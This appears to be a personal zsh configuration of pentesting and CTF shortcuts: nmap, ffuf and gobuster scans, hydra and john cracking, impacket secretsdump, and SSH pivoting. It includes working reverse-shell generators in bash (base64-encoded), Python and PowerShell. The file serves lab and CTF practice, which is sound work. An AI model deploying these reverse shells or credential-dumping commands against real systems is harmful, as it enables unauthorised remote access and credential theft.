# ------------------------------------------------------------------------------
# --- Custom Aliases for Pentesting & Productivity ---
# ------------------------------------------------------------------------------

# -- Networking & Recon --
alias nmap-full='nmap -p- -sV -sC -oA nmap/full' # Full TCP scan (all ports, service version, default scripts)
alias nmap-quick='nmap -T4 -F -oA nmap/quick'   # Quick TCP scan (fast mode, top 100 ports)
alias nmap-udp='sudo nmap -sU -sV --top-ports 200 -oA nmap/udp' # Top 200 UDP ports scan (requires sudo)
alias listen='sudo nc -nlvp'                   # Netcat listener with privileges
alias http-server='python3 -m http.server'     # Simple Python HTTP server on port 8000
alias ip-local='ip -4 -br a'                   # Show local IPv4 addresses
alias ip-public='curl -s ifconfig.me; echo'    # Get public IP address

# -- Web Pentesting --
# Usage: gobuster-dir -u http://<TARGET>
alias gobuster-dir='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'

# -- Exploitation --
alias msf='msfconsole'

# -- General Productivity --
alias ls='ls --color=auto'
alias ll='ls -lAhF'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'

# -- System Management --
alias update='sudo apt update && sudo apt full-upgrade -y'
alias install='sudo apt install -y'
alias remove='sudo apt remove -y'
alias search='apt-cache search'
alias autoremove='sudo apt autoremove -y'

# -- Process Management --
alias top='htop'
alias psg="ps aux | grep -v grep | grep -i -e VSZ -e"

# -- Nmap Advanced Scans --
alias nmap-vuln='nmap --script vuln -oA nmap/vuln' # Nmap vulnerability scan
alias nmap-enum='nmap -sV -sC -A -oA nmap/enum'   # Nmap aggressive enumeration
alias nmap-ping='nmap -sn'                        # Ping scan only, no port scan

# -- Advanced Web Fuzzing --
alias gb-vhost='gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt' # Gobuster vhost/subdomain enum
# Usage: ffuf-dir -u http://<TARGET>/FUZZ
alias ffuf-dir='ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c'
# Usage: ffuf-vhost -u http://<TARGET> -H "Host: FUZZ.<TARGET>"
alias ffuf-vhost='ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c'

# -- Password Cracking --
# Usage: hydra-ssh <TARGET>
alias hydra-ssh='hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://'
# Usage: jtr <HASH_FILE>
alias jtr='john --wordlist=/usr/share/wordlists/rockyou.txt'
alias jtr-show='john --show'

# -- Active Directory (impacket) --
# Usage: imp-getnpusers <DOMAIN>/ -usersfile <USER_FILE> -dc-ip <DC_IP>
alias imp-getnpusers='impacket-getnpusers -request'
# Usage: imp-secrets <DOMAIN>/<USER>@<TARGET_IP>
alias imp-secrets='impacket-secretsdump -just-dc-ntlm'

# -- System & Network --
alias hosts='sudo nano /etc/hosts'
# Usage: addhost 10.10.10.10 evil.corp
addhost() {
    if [ -n "$1" ] && [ -n "$2" ]; then
        echo "$1\t$2" | sudo tee -a /etc/hosts
        echo "Added '$2' to /etc/hosts"
    else
        echo "Usage: addhost <IP> <HOSTNAME>"
    fi
}

# ------------------------------------------------------------------------------
# --- Custom Aliases and Functions for CTFs ---
# ------------------------------------------------------------------------------

# -- IP y Configuración --
alias myip='ip -f inet addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"'
alias me='echo $(hostname -I | awk "{print $1}")'
alias tun0='echo $(ip -f inet addr show tun0 | sed -En -e "s/.*inet ([0-9.]+).*/\1/p") | xclip -sel clip'

# -- Navegación Rápida --
alias c='clear'
alias lf='ls -alF'

# -- Herramientas Comunes --
alias h='history'
alias hg='history | grep'

# -- Nmap Rápido --
alias nmap_tcp='nmap -sC -sV -oN'
alias nmap_udp='sudo nmap -sU -oN' # Added sudo
alias nmapi='nmap --top-ports 1000 -Pn'

# -- Funciones Simples pero Productivas --

# Crear directorio y entrar
mkcd() {
    mkdir -p "$1"
    cd "$1"
}

# Listar y cambiar directorio
cl() {
    cd "$1" && ls -la
}

# Servidor HTTP rápido
serve() {
    PORT=${1:-8000} # Default to 8000 to avoid needing sudo
    echo "Serving on port $PORT"
    python3 -m http.server $PORT
}

# Copiar tu IP actual al portapapeles
myvpnip() {
    IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
    if [ -z "$IP" ]; then
        echo "Error: tun0 interface not found or has no IP."
        return 1
    fi
    echo $IP | xclip -sel clip
    echo "Copied: $IP"
}

# Búsqueda en historial con FZF (si tienes fzf instalado)
fh() {
    history | fzf | xargs
}

# -- Funciones ZSH Avanzadas para CTFs --

# - Reverse Shells -
rev_bash() {
    if [ $# -ne 2 ]; then
        echo "Usage: rev_bash <IP> <PORT>"
        return 1
    fi
    PAYLOAD="bash -i >& /dev/tcp/$1/$2 0>&1"
    B64=$(echo -n "$PAYLOAD" | base64 -w0)
    echo "echo $B64 | base64 -d | bash" | xclip -sel clip
    echo "[+] Copied to clipboard: echo $B64 | base64 -d | bash"
    echo "[+] Start listener: nc -nlvp $2"
}

rev_python() {
    if [ $# -ne 2 ]; then
        echo "Usage: rev_python <IP> <PORT>"
        return 1
    fi
    PAYLOAD="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
    echo "$PAYLOAD" | xclip -sel clip
    echo "[+] Copied to clipboard."
    echo "[+] Start listener: nc -nlvp $2"
}

rev_ps() {
    if [ $# -ne 2 ]; then
        echo "Usage: rev_ps <IP> <PORT>"
        return 1
    fi
    CMD="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$1',$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|{%{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo "$CMD" | xclip -sel clip
    echo "[+] Copied PowerShell reverse shell to clipboard."
}

# - Enumeración Web -
fuzz_dirs() {
    if [ $# -lt 1 ]; then
        echo "Usage: fuzz_dirs <URL> [WORDLIST] [SIZE_FILTER]"
        return 1
    fi
    WORDLIST=${2:-/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt}
    FILTER=${3:--fs 0}
    ffuf -u "$1/FUZZ" -w "$WORDLIST" $FILTER
}

fuzz_vhost() {
    if [ $# -lt 2 ]; then
        echo "Usage: fuzz_vhost <DOMAIN> <IP> [WORDLIST]"
        return 1
    fi
    WORDLIST=${3:-/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt}
    ffuf -u "http://$2" -H "Host: FUZZ.$1" -w "$WORDLIST" -fs 0
}

quick_nmap() {
    if [ $# -lt 1 ]; then
        echo "Usage: quick_nmap <IP>"
        return 1
    fi
    nmap -sV -sC --top-ports 1000 -v "$1" | tee nmap_output.txt
}

enum_web_services() {
    if [ $# -lt 1 ]; then
        echo "Usage: enum_web_services <IP> [PORT]"
        return 1
    fi
    PORT=${2:-80}
    whatweb "http://$1:$PORT" -v | tee web_enum.txt
    echo "[+] Results saved to web_enum.txt"
}

# - Utilidades de Cracking -
john_quick() {
    if [ $# -lt 1 ]; then
        echo "Usage: john_quick <HASH_FILE>"
        return 1
    fi
    john --wordlist=/usr/share/wordlists/rockyou.txt "$1"
}

hashcat_quick() {
    if [ $# -lt 3 ]; then
        echo "Usage: hashcat_quick <HASH_MODE> <HASH_FILE> <WORDLIST>"
        return 1
    fi
    hashcat -a 0 -m "$1" "$2" "$3"
}

crack_hash() {
    if [ $# -lt 1 ]; then
        echo "Usage: crack_hash <HASH>"
        return 1
    fi
    echo "$1" > temp_hash.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 temp_hash.txt
    rm temp_hash.txt
}

# - Gestión de Objetivos -
target() {
    export TARGET="$1"
    export RHOST="$1"
    echo "[+] Target set to: $TARGET"
}

showtarget() {
    echo "[+] Current target: $TARGET"
    echo "[+] Current RHOST: $RHOST"
}

ctf_setup() {
    NAME=${1:-ctf_target}
    mkdir -p "$NAME"/{{recon,exploit,data,scripts}}
    echo "[+] CTF structure created in $NAME/"
}

save_output() {
    if [ $# -lt 2 ]; then
        echo "Usage: save_output <FILENAME> <CONTENT>"
        return 1
    fi
    echo "$2" > "data/$1"
    echo "[+] Saved to data/$1"
}

# - Análisis Binario Rápido -
bininfo() {
    if [ ! -f "$1" ]; then
        echo "File not found: $1"
        return 1
    fi
    echo "=== File Info ==="
    file "$1"
    echo "=== Strings (first 20) ==="
    strings "$1" | head -20
    echo "=== Linked Libraries (ldd) ==="
    ldd "$1" 2>/dev/null || echo "Not an ELF executable or ldd failed."
}

extract_strings() {
    for file in "$@"; do
        echo "[*] Strings from $file:"
        strings "$file" | grep -E -i "flag|password|key|secret|admin"
    done
}

bindiff() {
    if [ $# -ne 2 ]; then
        echo "Usage: bindiff <FILE1> <FILE2>"
        return 1
    fi
    echo "[*] Comparing $1 and $2"
    cmp -bl "$1" "$2" | head -20
}

# - Utilidades de Pivoting -
socks_proxy() {
    if [ $# -lt 2 ]; then
        echo "Usage: socks_proxy <USER@HOST> <PORT>"
        return 1
    fi
    echo "[+] Setting up SOCKS proxy via $1 on local port $2"
    ssh -D $2 -N -f "$1"
    echo "[+] Proxy running on 127.0.0.1:$2. Use with proxychains."
}

fwport() {
    if [ $# -lt 4 ]; then
        echo "Usage: fwport <REMOTE_IP_TO_FWD> <REMOTE_PORT_TO_FWD> <LOCAL_PORT> <SSH_TARGET_USER@HOST>"
        return 1
    fi
    echo "[+] Forwarding remote port $1:$2 to local port $3 via $4"
    ssh -L "$3:$1:$2" "$4" -N -f
    echo "[+] Port forwarding active."
}

alias actzs='source ~/.zshrc'

# ------------------------------------------------------------------------------
# -- Custom Aliases from Gemini CLI (added by Gemini) --
vpn() {
    sudo openvpn "$@"
}
alias hosts='sudo nano /etc/hosts'

# -- Rustscan --
alias rs-full='rustscan -a' # Usage: rs-full <TARGET> -- -sC -sV

# -- Advanced Web Fuzzing (simplified) --
# Usage: ffuf-dir <URL> [WORDLIST]
ffuf-dir() {
    URL=$1
    WORDLIST=${2:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}
    ffuf -u $URL/FUZZ -w $WORDLIST -c
}

# Usage: ffuf-vhost <URL> <HOST_HEADER> [WORDLIST]
ffuf-vhost() {
    URL=$1
    HOST=$2
    WORDLIST=${3:-/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt}
    ffuf -u $URL -H "Host: FUZZ.$HOST" -w $WORDLIST -c
}
